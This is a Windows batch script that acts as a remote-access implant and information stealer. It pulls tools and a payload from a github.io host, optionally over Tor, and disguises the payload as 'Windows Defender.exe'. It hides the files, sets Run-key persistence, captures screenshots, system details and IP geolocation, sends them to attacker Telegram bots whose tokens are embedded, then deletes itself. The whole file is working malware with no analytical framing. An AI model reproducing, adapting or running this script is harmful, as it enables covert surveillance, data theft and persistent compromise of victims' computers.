@echo off
del /s /f /q /a "%temp%\*"
FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

Set host=https://cryptedodissey.github.io

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
  set "proxy=--tlsv1"
)

attrib -s -h -i "C:\Windows\expose.exe" 
if exist "C:\Windows\expose.exe" (
    attrib +s +h +i "C:\Windows\expose.exe"
) else (
    curl.exe -k %proxy% %host%/Tools/expose.zip --output "%temp%\expose.zip" && "C:\Windows\7-Zip\7z.exe" x "%temp%\expose.zip" -o"C:\Windows" -y && attrib +s +h +i "C:\Windows\expose.exe" && del "%temp%\expose.zip"
)
 
if exist "C:\Windows\apache2\bin\httpd.exe" (
    echo.
) else (
    curl.exe -k %proxy% %host%/Tools/apache2.zip --output "%temp%\apache2.zip" && "C:\Windows\7-Zip\7z.exe" x "%temp%\apache2.zip" -o"C:\Windows" -y && attrib +s +h +i "C:\Windows\apache2" && del "%temp%\apache2.zip"
)

attrib -s -h -i "C:\Windows\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "C:\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"

mkdir "%appdata%\Ookla\Speedtest CLI" && attrib +s +h +i "%appdata%\Ookla"

curl.exe -k %proxy% %host%/Capture/speedtest.exe --output "%appdata%\Ookla\Speedtest CLI\speedtest.exe"

set "folder=%random%"
mkdir "%temp%\%folder%" 
attrib +s +h +i "%temp%\%folder%" 
cd "%temp%\%folder%"

curl.exe -k %proxy% %host%/Capture/osinfo.vbs --output "osinfo.vbs"
nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
echo      =================== >> "%username%@%computername%.txt"
echo      =================== >> "%username%@%computername%.txt"

for /f "tokens=2 delims==" %%G in ('wmic os get Caption /value') do ( 
    set WinEdition=%%G
    )
for /f "tokens=2 delims==" %%G in ('wmic os get OSArchitecture /value') do ( 
    set OSArchitecture=%%G
    )
for /f "tokens=*" %%A in (
  'curl -k ipinfo.io/ip'
) Do set ExtIP=%%A
for /f "tokens=*" %%A in (
  'curl -k ipinfo.io/city'
) Do set City=%%A
for /f "tokens=*" %%A in (
  'curl -k ipinfo.io/region'
) Do set Region=%%A
for /f "tokens=*" %%A in (
  'curl -k ipinfo.io/country'
) Do set Country=%%A
for /f "tokens=1* delims=: " %%A in (
  'curl -k ipinfo.io/org'
) Do set ISP=%%B
for /f "tokens=1* delims=: " %%A in (
  'curl -k %proxy% https://iplist.cc/api 2^>NUL^|find "tor"'
) Do set TorStatus=%%B
if [%TorStatus%]==[true] (
for /f "tokens=*" %%A in (
  'curl -k %proxy% ipinfo.io/ip'
) Do set ExtIPTor=%%A
) else (
set "ExtIPTor=N/A"
)

if exist "%temp%\expose.txt" (
    for /f "delims=" %%x in ('type %temp%\expose.txt') do set "Expose=%%x" 
) else (
   set "Expose=N/A"
)

curl.exe -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] [Web Server: %Expose%] " https://api.telegram.org/bot5477476868:AAFhkFpzY4ZQZm4NkKCUmyjIpYj_KOKF5CY/sendMessage?chat_id=-1001540530403
for %%# in ("*.png") do curl.exe -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot5491026940:AAE3_nuWEDnViLI_kJEchTNQgHSpxqSlV3k/sendDocument?chat_id=-1001754616308 -k --insecure
curl.exe -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot5512879840:AAHYmF561WGn5fgOF1tp1OUGxAcK7TaTKu4/sendDocument?chat_id=-1001656341327 -k --insecure

cd "%temp%"
rmdir /s /q "%temp%\%folder%"

"C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
del /s /f /q /a "%~f0"
